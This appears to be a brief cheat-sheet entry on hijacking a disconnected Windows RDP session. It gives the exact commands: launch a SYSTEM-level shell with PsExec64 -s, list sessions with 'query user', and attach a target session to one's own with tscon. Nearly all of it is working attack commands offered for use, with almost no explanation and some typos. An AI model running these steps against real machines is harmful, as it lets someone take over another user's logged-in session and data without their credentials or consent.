
open the cmd with administrative privileges

```shell-session
PsExec64.exe -s cmd.exe
```

```
C:\> query user
```
target the rdp session with `disc` written on it


```shell-session
tscon 3 /dest:rdp-tcp#6
```

in above command the 3 in the rdp session you are targeting annd /dest is the destination
 that means the name of your rdp session


